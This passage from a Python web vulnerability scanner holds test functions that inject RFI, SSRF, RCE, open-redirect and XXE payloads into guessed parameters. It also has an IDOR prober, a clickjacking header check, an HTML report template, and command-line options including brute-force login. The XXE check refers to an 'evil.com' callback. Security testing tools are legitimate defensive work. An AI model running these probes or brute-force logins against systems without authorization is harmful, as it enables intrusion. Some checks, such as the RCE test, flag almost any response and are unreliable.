                        if 'hidden_fields' in kwargs and kwargs['hidden_fields']: post_data.update(kwargs['hidden_fields'])
                        
                        response = session.post(post_target_url, data=post_data, timeout=10)
                        if response.status_code == 200 and "rfi_test_success_marker" in (response.text.lower() if response.text else ""):
                             results.append({"name": f"RFI via POST param '{param}'", "value": f"Vulnerable URL: {post_target_url}", "rfi_url": rfi_target, "is_vulnerable": True})
                             status = f"Remote File Inclusion vulnerability detected via POST parameter '{param}'."
                             is_vulnerable = True
                             break
                   except requests.exceptions.RequestException as e:
                        log_error(f"Error testing RFI POST with URL '{rfi_target}' on param '{param}' for {post_target_url}: {e}")
              if is_vulnerable and results and results[-1]['is_vulnerable']: break

    if not is_vulnerable:
        status = "Remote File Inclusion test completed. No vulnerabilities detected with given URLs and parameters."
        
    return {"test_name": "Remote File Inclusion (RFI)", "url": url, "status": status, "details": results, "is_vulnerable": is_vulnerable}

def test_ssrf(url, ssrf_urls, session, **kwargs): 
    results = []
    is_vulnerable = False
    status = "SSRF test completed. No obvious vulnerabilities detected with basic checks."
    
    param_names = ['url', 'host', 'site', 'next', 'redirect_uri', 'target', 'dest', 'go', 'return_to', 'callback', 'goto', 'forward', 'rurl', 'continue', 'resource', 'file']
    
    post_target_url = kwargs.get('data_url', url)
    if not urlparse(post_target_url).scheme:
         post_target_url = urljoin(url, post_target_url)

   
    for param in param_names:
        for ssrf_target in ssrf_urls:
            try:
                
                test_url = f"{url}?{param}={requests.utils.quote(ssrf_target)}"
                response = session.get(test_url, timeout=10)
                
                
                response_text_lower = response.text.lower() if response.text else ""
                if response.status_code == 200 and \
                   ('127.0.0.1' in response_text_lower or 'localhost' in response_text_lower or '169.254.169.254' in response_text_lower or 'metadata' in response_text_lower or 'instance-identity' in response_text_lower or '10.' in response_text_lower or '192.168.' in response_text_lower): # Check for internal IPs or cloud metadata
                    
                    results.append({"name": f"SSRF via param '{param}'", "value": f"Potentially vulnerable URL: {test_url}", "target_url": ssrf_target, "is_vulnerable": True})
                    status = f"Potential SSRF vulnerability detected via GET parameter '{param}' targeting {ssrf_target}."
                    is_vulnerable = True
                    break
            except requests.exceptions.RequestException as e:
                log_error(f"Error testing SSRF GET with target '{ssrf_target}' on param '{param}' for {url}: {e}")
        if is_vulnerable and results and results[-1]['is_vulnerable']: break
        
    
    if kwargs.get('data_url') or urlparse(url).path.endswith(('/proxy', '/fetch', '/resource', '/get', '/redirect')): 
         for param in param_names:
              for ssrf_target in ssrf_urls:
                   try:
                        post_data = {param: ssrf_target}
                        if 'hidden_fields' in kwargs and kwargs['hidden_fields']: post_data.update(kwargs['hidden_fields'])
                        
                        response = session.post(post_target_url, data=post_data, timeout=10)
                        response_text_lower = response.text.lower() if response.text else ""
                        if response.status_code == 200 and \
                           ('127.0.0.1' in response_text_lower or 'localhost' in response_text_lower or 'metadata' in response_text_lower or '169.254.169.254' in response_text_lower):
                             results.append({"name": f"SSRF via POST param '{param}'", "value": f"Potentially vulnerable URL: {post_target_url}", "target_url": ssrf_target, "is_vulnerable": True})
                             status = f"Potential SSRF vulnerability detected via POST parameter '{param}' targeting {ssrf_target}."
                             is_vulnerable = True
                             break
                   except requests.exceptions.RequestException as e:
                        log_error(f"Error testing SSRF POST with target '{ssrf_target}' on param '{param}' for {post_target_url}: {e}")
              if is_vulnerable and results and results[-1]['is_vulnerable']: break

    if not is_vulnerable:
        status = "SSRF test completed. No obvious vulnerabilities detected with given targets and parameters."
        
    return {"test_name": "Server-Side Request Forgery (SSRF)", "url": url, "status": status, "details": results, "is_vulnerable": is_vulnerable}

def test_rce(url, payload_list, session, **kwargs): 
    results = []
    is_vulnerable = False
    status = "Remote Code Execution test completed. No vulnerabilities detected."
    
    param_names = ['cmd', 'command', 'exec', 'query', 'run', 'bash', 'sh', 'system', 'do', 'action', 'view', 'page', 'file']
    
    post_target_url = kwargs.get('data_url', url)
    if not urlparse(post_target_url).scheme:
         post_target_url = urljoin(url, post_target_url)

    
    for param in param_names:
        for payload in payload_list:
            try:
                encoded_payload = requests.utils.quote(payload)
                test_url = f"{url}?{param}={encoded_payload}"
                
                response = session.get(test_url, timeout=10)
                response_text_lower = response.text.lower() if response.text else ""
                
               
                if response.status_code == 200 and \
                   (any(kw in response_text_lower for kw in ['root:', 'uid=', 'windows', 'system', 'linux', 'darwin', 'apache', 'nginx', 'server version']) or \
                   
                    not any(err in response_text_lower for err in ['permission denied', 'command not found', 'invalid command', 'syntax error', 'not recognized'])):
                    
                    results.append({"name": f"RCE via param '{param}'", "value": f"Vulnerable URL: {test_url}", "payload": payload, "is_vulnerable": True})
                    status = f"Remote Code Execution vulnerability detected via GET parameter '{param}'."
                    is_vulnerable = True
                    break
            except requests.exceptions.RequestException as e:
                log_error(f"Error testing RCE GET with payload '{payload}' on param '{param}' for {url}: {e}")
        if is_vulnerable and results and results[-1]['is_vulnerable']: break

    
    if kwargs.get('data_url') or urlparse(url).path.endswith(('/execute', '/run', '/command', '/system', '/api')): 
         for param in param_names:
              for payload in payload_list:
                   try:
                        post_data = {param: payload}
                        if 'hidden_fields' in kwargs and kwargs['hidden_fields']: post_data.update(kwargs['hidden_fields'])
                        
                        response = session.post(post_target_url, data=post_data, timeout=10)
                        response_text_lower = response.text.lower() if response.text else ""
                        if response.status_code == 200 and \
                           (any(kw in response_text_lower for kw in ['root:', 'uid=', 'windows', 'system']) or \
                            not any(err in response_text_lower for err in ['permission denied', 'command not found'])):
                             results.append({"name": f"RCE via POST param '{param}'", "value": f"Vulnerable URL: {post_target_url}", "payload": payload, "is_vulnerable": True})
                             status = f"Remote Code Execution vulnerability detected via POST parameter '{param}'."
                             is_vulnerable = True
                             break
                   except requests.exceptions.RequestException as e:
                        log_error(f"Error testing RCE POST with payload '{payload}' on param '{param}' for {post_target_url}: {e}")
              if is_vulnerable and results and results[-1]['is_vulnerable']: break

    if not is_vulnerable:
        status = "Remote Code Execution test completed. No obvious vulnerabilities detected with given payloads and parameters."
        
    return {"test_name": "Remote Code Execution (RCE)", "url": url, "status": status, "details": results, "is_vulnerable": is_vulnerable}

def test_open_redirect(url, redirect_urls, session, **kwargs): 
    results = []
    is_vulnerable = False
    status = "Open Redirect test completed. No vulnerabilities detected."
    
    param_names = ['redirect', 'url', 'next', 'return', 'goto', 'redir', 'forward', 'rurl', 'continue', 'dest', 'target', 'callback', 'site']
    
    post_target_url = kwargs.get('data_url', url)
    if not urlparse(post_target_url).scheme:
         post_target_url = urljoin(url, post_target_url)

    
    for param in param_names:
        for target_url in redirect_urls:
            try:
                test_url = f"{url}?{param}={requests.utils.quote(target_url)}"
                
                response = session.get(test_url, timeout=10, allow_redirects=False) 
                
                final_redirect_location = response.headers.get('Location')
                
                if response.status_code in [301, 302] and final_redirect_location:
                     
                     if final_redirect_location.startswith(target_url):
                          results.append({"name": f"Open Redirect via param '{param}'", "value": f"Vulnerable URL: {test_url}", "target_url": target_url, "is_vulnerable": True})
                          status = f"Open Redirect vulnerability detected via GET parameter '{param}'."
                          is_vulnerable = True
                          break
                     
                     else:
                          try:
                               full_response = session.get(test_url, timeout=10, allow_redirects=True)
                               if full_response.url.startswith(target_url):
                                    results.append({"name": f"Open Redirect via param '{param}'", "value": f"Vulnerable URL: {test_url} (Landed on {full_response.url})", "target_url": target_url, "is_vulnerable": True})
                                    status = f"Open Redirect vulnerability detected via GET parameter '{param}'."
                                    is_vulnerable = True
                                    break
                          except requests.exceptions.RequestException:
                               pass 
            
            except requests.exceptions.RequestException as e:
                log_error(f"Error testing Open Redirect GET with target '{target_url}' on param '{param}' for {url}: {e}")
        if is_vulnerable and results and results[-1]['is_vulnerable']: break

    
    if kwargs.get('data_url') or urlparse(url).path.endswith(('/redirect', '/goto', '/forward')): 
         for param in param_names:
              for target_url in redirect_urls:
                   try:
                        post_data = {param: target_url}
                        if 'hidden_fields' in kwargs and kwargs['hidden_fields']: post_data.update(kwargs['hidden_fields'])
                        
                        response = session.post(post_target_url, data=post_data, timeout=10, allow_redirects=False)
                        final_redirect_location = response.headers.get('Location')
                        
                        if response.status_code in [301, 302] and final_redirect_location and final_redirect_location.startswith(target_url):
                             results.append({"name": f"Open Redirect via POST param '{param}'", "value": f"Vulnerable URL: {post_target_url}", "target_url": target_url, "is_vulnerable": True})
                             status = f"Open Redirect vulnerability detected via POST parameter '{param}'."
                             is_vulnerable = True
                             break
                   except requests.exceptions.RequestException as e:
                        log_error(f"Error testing Open Redirect POST with target '{target_url}' on param '{param}' for {post_target_url}: {e}")
              if is_vulnerable and results and results[-1]['is_vulnerable']: break

    if not is_vulnerable:
        status = "Open Redirect test completed. No vulnerabilities detected with given targets and parameters."
        
    return {"test_name": "Open Redirect", "url": url, "status": status, "details": results, "is_vulnerable": is_vulnerable}

def test_clickjacking(url, session, **kwargs): 
    results = []
    is_vulnerable = False
    status = "Clickjacking protection check completed."
    try:
        response = session.get(url, timeout=10)
        x_frame_options = response.headers.get('X-Frame-Options', 'Not Present')
        csp = response.headers.get('Content-Security-Policy', '')

        
        if x_frame_options.upper() == 'DENY':
            results.append({"name": "X-Frame-Options", "value": x_frame_options, "is_vulnerable": False})
            status += " X-Frame-Options: DENY (Mitigated). "
        elif x_frame_options.upper() == 'SAMEORIGIN':
            results.append({"name": "X-Frame-Options", "value": x_frame_options, "is_vulnerable": False})
            status += " X-Frame-Options: SAMEORIGIN (Mitigated). "
        elif x_frame_options.upper() == 'ALLOW-FROM': 
             results.append({"name": "X-Frame-Options", "value": x_frame_options, "is_vulnerable": True}) 
             status += " X-Frame-Options: ALLOW-FROM (Potentially weak/deprecated). "
             is_vulnerable = True
        else: 
            results.append({"name": "X-Frame-Options", "value": x_frame_options, "is_vulnerable": True})
            status += f" X-Frame-Options: {x_frame_options} (Not present or weak - Potentially vulnerable). "
            is_vulnerable = True

        
        csp_frame_ancestors_present = False
        if 'frame-ancestors' in csp.lower():
            csp_frame_ancestors_present = True
           
            if "'*'" in csp.lower() or "'* '" in csp.lower(): 
                 results.append({"name": "Content-Security-Policy (frame-ancestors)", "value": csp, "is_vulnerable": True})
                 status += " CSP frame-ancestors: '*' found (Potentially vulnerable). "
                 is_vulnerable = True
            else:
                 results.append({"name": "Content-Security-Policy (frame-ancestors)", "value": csp, "is_vulnerable": False})
                 status += " CSP frame-ancestors directive found (Likely mitigated). "
        
        
        if not csp_frame_ancestors_present and is_vulnerable: 
            results.append({"name": "Content-Security-Policy", "value": csp if csp else "Not Present", "is_vulnerable": True})
            status += " CSP missing frame-ancestors directive (Vulnerable if XFO is weak). "
        elif not csp_frame_ancestors_present and not is_vulnerable: 
             results.append({"name": "Content-Security-Policy", "value": csp if csp else "Not Present", "is_vulnerable": False})
             status += " CSP missing frame-ancestors directive (Mitigated by X-Frame-Options). "


    except requests.exceptions.RequestException as e:
        log_error(f"Error testing Clickjacking for {url}: {e}")
        status = f"Error checking Clickjacking: {e}"
        is_vulnerable = True
        results.append({"name": "Clickjacking Check Status", "value": f"Request error: {e}", "is_vulnerable": True})
        
    return {"test_name": "Clickjacking Protection", "url": url, "status": status, "details": results, "is_vulnerable": is_vulnerable}

def test_idor(url, session, **kwargs): 
    results = []
    is_vulnerable = False
    status = "IDOR test completed. No obvious vulnerabilities detected with basic checks."
    
    potential_ids = set()
    
    
    parsed_url = urlparse(url)
    query_params = parsed_url.query.split('&')
    for param in query_params:
        if '=' in param:
            key, value = param.split('=', 1)
            if key.lower() in ['id', 'user_id', 'account_id', 'order_id', 'document_id', 'resource_id', 'item_id', 'profile_id'] and value.isdigit() and int(value) > 0:
                potential_ids.add(value)
                
    
    try:
        response = session.get(url, timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        
        
        for link in soup.find_all('a', href=True):
            href = link.get('href')
            
            matches = re.findall(r'(?:/user/|/profile/|/account/|/order/|/document/|/resource/|/item/|id=|user_id=|account_id=)(\d+)', href)
            for match in matches:
                if int(match) > 0: potential_ids.add(match)
                
        
        for input_tag in soup.find_all('input', {'type': 'hidden'}):
            name = input_tag.get('name', '').lower()
            value = input_tag.get('value')
            if name in ['id', 'user_id', 'account_id', 'order_id'] and value and value.isdigit() and int(value) > 0:
                potential_ids.add(value)
                
    except requests.exceptions.RequestException as e:
        log_warning(f"Could not fetch URL {url} for IDOR analysis: {e}")
        
    
    if not potential_ids:
        potential_ids.update(['1', '2', '3', '10', '100', '999']) 
        
    base_url_for_checking = urlparse(url).scheme + "://" + urlparse(url).netloc
    
    
    checked_ids_accessed = set()
    
    test_ids = list(potential_ids)
    if '1' in test_ids and '2' not in test_ids: test_ids.append('2')
    if '2' in test_ids and '3' not in test_ids: test_ids.append('3')
    
    for user_id_str in test_ids:
        try:
             current_id = int(user_id_str)
             
             ids_to_test = {current_id}
             if current_id + 1 > 0: ids_to_test.add(current_id + 1)
             if current_id - 1 > 0: ids_to_test.add(current_id - 1)
             
             for test_id in sorted(list(ids_to_test)):
                  if test_id == 0: continue 
                  
                  test_id_str = str(test_id)
                  
                  
                  patterns_to_try = [
                      f"/user/{test_id_str}", f"/profile/{test_id_str}", f"/account/{test_id_str}",
                      f"/order/{test_id_str}", f"/document/{test_id_str}", f"/resource/{test_id_str}",
                      f"?id={test_id_str}", f"?user_id={test_id_str}", f"?account_id={test_id_str}", f"?order_id={test_id_str}",
                      f"?item_id={test_id_str}"
                  ]
                  
                  for pattern in patterns_to_try:
                       test_url = urljoin(base_url_for_checking, pattern)
                       
                       try:
                            response = session.get(test_url, timeout=10)
                            if response.status_code == 200:
                                 
                                 response_text_lower = response.text.lower() if response.text else ""
                                 if any(kw in response_text_lower for kw in ['admin', 'sensitive_data', 'password', 'secret', 'config', 'system logs']):
                                      results.append({"name": f"IDOR via {test_url}", "value": f"Potentially vulnerable. Accessed ID {test_id_str} with unexpected sensitive content.", "is_vulnerable": True})
                                      status = f"Potential IDOR vulnerability detected accessing resource with ID {test_id_str}."
                                      is_vulnerable = True
                                      break 
                                 
                       except requests.exceptions.RequestException as e:
                            log_error(f"Error testing IDOR for {test_url}: {e}")
                  if is_vulnerable: break 
             if is_vulnerable: break 

        except ValueError: 
             continue

    if not is_vulnerable:
        status = "IDOR test completed. No obvious vulnerabilities detected with basic checks."
        
    return {"test_name": "Insecure Direct Object Reference (IDOR)", "url": url, "status": status, "details": results, "is_vulnerable": is_vulnerable}

def test_xxexml(url, payload_list, session, **kwargs): 
    results = []
    is_vulnerable = False
    status = "XXE test completed. No vulnerabilities detected."
    
    
    
    param_names = ['xml', 'data', 'payload', 'request', 'body', 'config', 'input']
    
    xml_endpoints_to_try = [urljoin(url, '/api/xml'), urljoin(url, '/service'), urljoin(url, '/parse')]
    if kwargs.get('data_url'):
        xml_endpoints_to_try.insert(0, kwargs['data_url']) 
        
   
    xml_endpoints_to_try = list(dict.fromkeys([ep for ep in xml_endpoints_to_try if urlparse(ep).scheme]))
    
    for endpoint in xml_endpoints_to_try:
        for param in param_names:
            for payload in payload_list:
                try:
                    
                    xml_data = f'<{param}>{payload}</{param}>'
                    
                    response = session.post(endpoint, data=xml_data, headers={'Content-Type': 'application/xml'}, timeout=10)
                    
                    
                    response_text_lower = response.text.lower() if response.text else ""
                    if response.status_code == 200 and \
                       (("<!doctype" in payload.lower() and ("root:" in response_text_lower or "systemroot" in response_text_lower or "file://" in response_text_lower)) or \
                        ("http://" in payload.lower() and "evil.com" in payload.lower() and "evil.com" in response_text_lower)): # Check for local file read or external callback
                        
                        results.append({"name": f"XXE via param '{param}' at {endpoint}", "value": f"Vulnerable Endpoint: {endpoint}", "payload": payload, "is_vulnerable": True})
                        status = f"XXE vulnerability detected via parameter '{param}' at {endpoint}."
                        is_vulnerable = True
                        break
                        
                except requests.exceptions.RequestException as e:
                    log_error(f"Error testing XXE with payload '{payload}' on param '{param}' for {endpoint}: {e}")
            if is_vulnerable and results and results[-1]['is_vulnerable']: break
        if is_vulnerable and results and results[-1]['is_vulnerable']: break

    if not is_vulnerable:
        status = "XXE test completed. No vulnerabilities detected with basic checks."
        
    return {"test_name": "XML External Entities (XXE)", "url": url, "status": status, "details": results, "is_vulnerable": is_vulnerable}



def run_test(test_func, url, session, **kwargs):
    """Helper to run a test function and store results."""
    try:
        log_info(f"Running test: {test_func.__name__} on {url}")
       
        result = test_func(url, session=session, **kwargs) 
        test_results_data.append(result)
        
        if result.get("is_vulnerable"):
            log_warning(f"VULNERABILITY FOUND: {result['test_name']} at {url}")
        else:
            log_info(f"Test completed: {result['test_name']} at {url} (Status: {result['status']})")
            
    except Exception as e:
        log_error(f"Failed to run test {test_func.__name__} for {url}: {e}")
        test_results_data.append({
            "test_name": test_func.__name__,
            "url": url,
            "status": f"Error during test execution: {e}",
            "details": [{"name": "Execution Error", "value": str(e), "is_vulnerable": True}],
            "is_vulnerable": True
        })

def generate_html_report(output_file, target_url, results):
    """Generates an HTML report from the collected test results."""
    try:
        
        env = Environment(loader=FileSystemLoader('.')) 
        template_filename = 'report_template.html'
        
        
        if not os.path.exists(template_filename):
            template_content = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web Security Scan Report</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; margin: 20px; background-color: #f4f7f6; color: #333; }
        .container { max-width: 1200px; margin: auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        h1, h2 { color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px; margin-bottom: 20px; }
        h1 { text-align: center; }
        table { width: 100%; border-collapse: collapse; margin-bottom: 30px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
        th, td { border: 1px solid #e0e0e0; padding: 12px 15px; text-align: left; }
        th { background-color: #ecf0f1; color: #34495e; font-weight: 600; }
        tr:nth-child(even) { background-color: #f8f9fa; }
        tr:hover { background-color: #e8f4fd; }
        .vulnerable { color: #e74c3c; font-weight: bold; }
        .safe { color: #2ecc71; font-weight: bold; }
        .details-table { margin-top: 10px; background-color: #fdfdfd; border: 1px dashed #bdc3c7;}
        .details-table th, .details-table td { border: 1px solid #eee; padding: 8px; }
        .error { color: #f39c12; }
        .summary-status { font-size: 1.1em; padding: 10px; border-radius: 5px; text-align: center; margin-bottom: 25px; }
        .summary-vulnerable { background-color: #fdedec; border: 1px solid #e74c3c; color: #c0392b; }
        .summary-safe { background-color: #e8f8f5; border: 1px solid #2ecc71; color: #16a085; }
        a { color: #3498db; text-decoration: none; }
        a:hover { text-decoration: underline; }
        .payload-value { word-break: break-all; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Web Security Scan Report</h1>
        <div class="summary-status {{ 'summary-vulnerable' if overall_vulnerable else 'summary-safe' }}">
            Overall Scan Status: <strong>{{ 'Vulnerabilities Found' if overall_vulnerable else 'No Major Vulnerabilities Detected' }}</strong>
        </div>
        <p><strong>Scan Date:</strong> {{ scan_date }}</p>
        <p><strong>Target URL:</strong> <a href="{{ target_url }}" target="_blank">{{ target_url }}</a></p>

        <h2>Test Results Summary</h2>
        <table>
            <thead>
                <tr>
                    <th>Test Name</th>
                    <th>URL Tested</th>
                    <th>Status</th>
                    <th>Vulnerable?</th>
                </tr>
            </thead>
            <tbody>
                {% for result in results %}
                <tr style="background-color: {% if result.is_vulnerable %}#fff0ef{% else %}#f9fdfd{% endif %};">
                    <td>{{ result.test_name }}</td>
                    <td><a href="{{ result.url }}" target="_blank">{{ result.url }}</a></td>
                    <td>{{ result.status }}</td>
                    <td><span class="{{ 'vulnerable' if result.is_vulnerable else 'safe' }}">{{ 'Yes' if result.is_vulnerable else 'No' }}</span></td>
                </tr>
                {% endfor %}
            </tbody>
        </table>

        <h2>Detailed Findings</h2>
        {% for result in results %}
        <div style="margin-bottom: 30px; border: 1px solid #ddd; border-radius: 5px; padding: 15px; background-color: {% if result.is_vulnerable %}#fff0ef{% else %}#f9fdfd{% endif %};">
            <h3>{{ result.test_name }}</h3>
            <p><strong>URL:</strong> <a href="{{ result.url }}" target="_blank">{{ result.url }}</a></p>
            <p><strong>Overall Status:</strong> <span class="{{ 'vulnerable' if result.is_vulnerable else 'safe' }}">{{ result.status }}</span></p>
            {% if result.details %}
            <p><strong>Details:</strong></p>
            <table class="details-table">
                <thead><tr><th>Detail Name</th><th>Value</th><th>Vulnerable?</th></tr></thead>
                <tbody>
                {% for detail in result.details %}
                <tr style="background-color: {% if detail.is_vulnerable %}#fdedec{% else %}#ffffff{% endif %};">
                    <td>{{ detail.name }}</td>
                    <td class="payload-value">{{ detail.value | replace('\n', '<br>') | safe }}</td>
                    <td><span class="{{ 'vulnerable' if detail.is_vulnerable else 'safe' }}">{{ 'Yes' if detail.is_vulnerable else 'No' }}</span></td>
                </tr>
                {% endfor %}
                </tbody>
            </table>
            {% endif %}
            {% if result.payload %}
             <p><strong>Payload Used:</strong> <span class="payload-value">{{ result.payload }}</span></p>
            {% endif %}
             {% if result.rfi_url %}
             <p><strong>RFI Target URL:</strong> {{ result.rfi_url }}</p>
            {% endif %}
             {% if result.target_url %}
             <p><strong>SSRF Target URL:</strong> {{ result.target_url }}</p>
            {% endif %}
        </div>
        {% endfor %}
    </div>
</body>
</html>
            """
            with open(template_filename, 'w', encoding='utf-8') as f:
                f.write(template_content)
            logging.info(f"Created a default report template: {template_filename}")

        template = env.get_template(template_filename)
        
        overall_vulnerable = any(r.get('is_vulnerable') for r in results)
        
        html_content = template.render(
            results=results,
            target_url=target_url,
            scan_date=time.strftime("%Y-%m-%d %H:%M:%S"),
            overall_vulnerable=overall_vulnerable
        )
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(html_content)
        log_info(f"HTML report generated successfully at: {output_file}")
        
    except Exception as e:
        log_error(f"Failed to generate HTML report: {e}")

def setup_argument_parser():
    """Sets up the argument parser with detailed help messages."""
    parser = argparse.ArgumentParser(
        description="Advanced Web Vulnerability Scanner",
        formatter_class=argparse.RawTextHelpFormatter, 
        epilog="""
---------------------------------------------------------------------
 Advanced Web Vulnerability Scanner Tool
---------------------------------------------------------------------

This tool scans a target URL for various common web vulnerabilities.
It uses a session-based approach for efficiency and supports custom
payloads and reporting.

Examples:
  # Basic scan of a target URL
  python %(prog)s --url http://example.com --scan-all --output report.html

  # Scan only for SQL Injection and XSS vulnerabilities
  python %(prog)s --url http://example.com --tests vuln --output report.html

  # Perform credential testing with a username and custom password list
  python %(prog)s --url http://example.com --username admin --tests creds --password-file passwords.txt

  # Scan using custom payloads from files and specify a POST data URL
  python %(prog)s --url http://example.com --scan-all --data-url http://example.com/api/process --sql-payload-file sql.txt --xss-payload-file xss.txt

  # Use session cookies for authenticated scanning
  python %(prog)s --url http://example.com --session-file cookies.json --scan-all --output report.html

---------------------------------------------------------------------
        """
    )
    
    
    parser.add_argument("--url", required=True, 
                        help="Target URL to scan (e.g., http://example.com or https://example.com). Scheme (http/https) is required.")
    
    scan_group = parser.add_mutually_exclusive_group(required=False)
    scan_group.add_argument("--scan-all", action="store_true",
                            help="Run all available vulnerability tests.")
    scan_group.add_argument("--tests", type=str,
                            help="Comma-separated list of test categories to run. Available categories:\n"
                                 "  basic   : Basic checks (HTTPS, Headers, Contact Info, Links, Site Info)\n"
                                 "  vuln    : Common vulnerabilities (SQLi, XSS, CSRF, DT, RFI, SSRF, RCE, ORedirect, Clickjack, IDOR, XXE)\n"
                                 "  admin   : Admin panel identification\n"
                                 "  creds   : Credential testing (Brute-force login)\n"
                                 "  all     : Equivalent to --scan-all\n"
                                 "Example: --tests basic,vuln")

    
    parser.add_argument("--username", type=str,
                        help="Username to use for credential testing (brute-force login).")
    parser.add_argument("--password-file", type=str,
                        help="Path to a file containing a list of passwords to test against the target login. Each password should be on a new line.")
    parser.add_argument("--session-file", type=str,
                        help="Path to a JSON file containing session cookies (e.g., {'sessionid': '...', 'csrftoken': '...'}). Used for authenticated scanning.")

    
    parser.add_argument("--sql-payload-file", type=str,
                        help="Path to a file containing custom SQL injection payloads. Each payload on a new line.")
    parser.add_argument("--xss-payload-file", type=str,
                        help="Path to a file containing custom XSS payloads. Each payload on a new line.")
    parser.add_argument("--rce-payload-file", type=str,
                        help="Path to a file containing custom RCE payloads. Each payload on a new line.")
    parser.add_argument("--dt-payload-file", type=str,
                        help="Path to a file containing custom Directory Traversal payloads. Each payload on a new line.")
    parser.add_argument("--rfi-url-file", type=str,
                        help="Path to a file containing custom RFI target URLs. Each URL on a new line.")
    parser.add_argument("--ssrf-url-file", type=str,
                        help="Path to a file containing custom SSRF target URLs. Each URL on a new line.")
    parser.add_argument("--redirect-url-file", type=str,
                        help="Path to a file containing custom Open Redirect target URLs. Each URL on a new line.")
    parser.add_argument("--xxe-payload-file", type=str,
                        help="Path to a file containing custom XXE payloads. Each payload on a new line.")
    parser.add_argument("--cmd-payload-file", type=str,
                        help="Path to a file containing custom Command Injection payloads. Each payload on a new line.")

    # --- Advanced Options ---
    parser.add_argument("--delay", type=float, default=0.5,
                        help="Delay in seconds between each HTTP request (default: 0.5). Adjust based on target responsiveness.")
    parser.add_argument("--output", type=str,
                        help="Path to save the HTML report file (e.g., report.html). If not provided, results are printed to the console.")
    parser.add_argument("--data-url", type=str,
                        help="Specific URL for POST requests (e.g., for login forms, API endpoints). If not specified, the tool tries to infer it or defaults to the target URL.")
    
    return parser

def main(args):
    target_url = args.url
    
    
    password_list = read_file_to_list(args.password_file) or DEFAULT_PREDEFINED_PASSWORDS
    sql_payloads = read_file_to_list(args.sql_payload_file) or DEFAULT_SQL_PAYLOADS
    xss_payloads = read_file_to_list(args.xss_payload_file) or DEFAULT_XSS_PAYLOADS
    rce_payloads = read_file_to_list(args.rce_payload_file) or DEFAULT_RCE_PAYLOADS
    dt_payloads = read_file_to_list(args.dt_payload_file) or DEFAULT_DT_PAYLOADS
    rfi_urls = read_file_to_list(args.rfi_url_file) or DEFAULT_RFI_URLS
    ssrf_urls = read_file_to_list(args.ssrf_url_file) or DEFAULT_SSRF_URLS
    open_redirect_urls = read_file_to_list(args.redirect_url_file) or DEFAULT_OPEN_REDIRECT_URLS
    xxe_payloads = read_file_to_list(args.xxe_payload_file) or DEFAULT_XXE_PAYLOADS
    cmd_injection_payloads = read_file_to_list(args.cmd_payload_file) or DEFAULT_CMD_INJECTION_PAYLOADS
    
    
    parsed_target_url = urlparse(target_url)
    if not parsed_target_url.scheme:
        target_url = "http://" + target_url
        log_warning(f"URL scheme missing, prepending 'http://': {target_url}")
    elif parsed_target_url.scheme not in ['http', 'https']:
        log_error(f"Invalid URL scheme: {parsed_target_url.scheme}. Only http and https are supported.")
        sys.exit(1)

    
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'})
    
    
    if args.session_file:
        try:
            with open(args.session_file, 'r', encoding='utf-8') as f:
                cookies_data = json.load(f)
                session.cookies.update(cookies_data)
                log_info(f"Loaded session cookies from {args.session_file}")
        except FileNotFoundError:
            log_error(f"Session file not found: {args.session_file}")
        except json.JSONDecodeError:
            log_error(f"Error decoding JSON from session file: {args.session_file}")
        except Exception as e:
            log_error(f"Could not load session cookies from {args.session_file}: {e}")

    
    all_tests_list = [
        test_security, extract_contact_info, scan_ports, extract_all_links, identify_admin_panels, display_site_info,
        test_passwords, test_sql_injection, test_xss, test_csrf, test_directory_traversal, test_remote_file_inclusion,
        test_ssrf, test_rce, test_open_redirect, test_clickjacking, test_idor, test_xxexml
    ]
    
    
    test_categories_map = {
        "all": all_tests_list,
        "basic": [test_security, extract_contact_info, scan_ports, display_site_info, extract_all_links],
        "vuln": [test_sql_injection, test_xss, test_csrf, test_directory_traversal, test_remote_file_inclusion, 
                 test_ssrf, test_rce, test_open_redirect, test_clickjacking, test_idor, test_xxexml],
        "admin": [identify_admin_panels],
        "creds": [test_passwords] 
    }
    
    selected_tests_funcs = []
    
    if args.scan_all:
        selected_tests_funcs = all_tests_list
    elif args.tests:
        test_keys = [t.strip().lower() for t in args.tests.split(',')]
        for key in test_keys:
            if key in test_categories_map:
                selected_tests_funcs.extend(test_categories_map[key])
            else:
                log_warning(f"Unknown test category '{key}'. Skipping.")
    else:
        
        selected_tests_funcs = test_categories_map["basic"] 
        log_info("No specific tests selected, running basic scan.")

    
    if args.username:
        is_creds_selected = False
        if args.scan_all: is_creds_selected = True
        elif args.tests:
             test_keys = [t.strip().lower() for t in args.tests.split(',')]
             if 'creds' in test_keys or 'all' in test_keys: is_creds_selected = True
        elif not args.tests: 
             is_creds_selected = True
             
        if is_creds_selected and test_passwords not in selected_tests_funcs:
             selected_tests_funcs.append(test_passwords)
             log_info("Credential test added due to --username argument.")

    
    seen_funcs = set()
    unique_test_funcs = [x for x in selected_tests_funcs if not (x in seen_funcs or seen_funcs.add(x))]

    
    all_extracted_links = None 
    
    for test_func in unique_test_funcs:
       
        test_kwargs = {'session': session}
        
        
        if test_func == test_passwords:
            if not args.username:
                log_warning("Username is required for credential testing (--username). Skipping password test.")
                continue
            test_kwargs['username'] = args.username
            test_kwargs['password_list'] = password_list
        elif test_func == test_sql_injection:
            test_kwargs['payload_list'] = sql_payloads
        elif test_func == test_xss:
            test_kwargs['payload_list'] = xss_payloads
        elif test_func == test_rce:
            test_kwargs['payload_list'] = rce_payloads
        elif test_func == test_directory_traversal:
            test_kwargs['payload_list'] = dt_payloads
        elif test_func == test_remote_file_inclusion:
            test_kwargs['rfi_urls'] = rfi_urls
        elif test_func == test_ssrf:
            test_kwargs['ssrf_urls'] = ssrf_urls
        elif test_func == test_open_redirect:
            test_kwargs['redirect_urls'] = open_redirect_urls
        elif test_func == test_xxexml:
